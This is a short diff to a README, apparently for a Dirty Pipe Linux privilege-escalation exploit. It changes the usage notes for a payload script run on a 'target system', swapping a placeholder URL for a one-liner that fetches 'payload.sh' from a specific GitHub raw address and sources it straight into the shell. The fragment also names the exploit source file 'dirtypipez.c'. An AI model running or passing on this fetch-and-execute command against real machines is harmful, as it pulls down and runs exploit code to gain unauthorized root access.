@@ -25,10 +25,10 @@ Once uploaded on the target system:
 source payload.sh
 ```
 
-If uploaded on a webserver:
+Or even easier:
 
 ```bash
-source <(curl -s https://webserver/payload.sh)
+source <(curl -s https://raw.githubusercontent.com/eric-glb/dirtypipe/main/payload.sh)
 ```
 
 ## `dirtypipez.c`
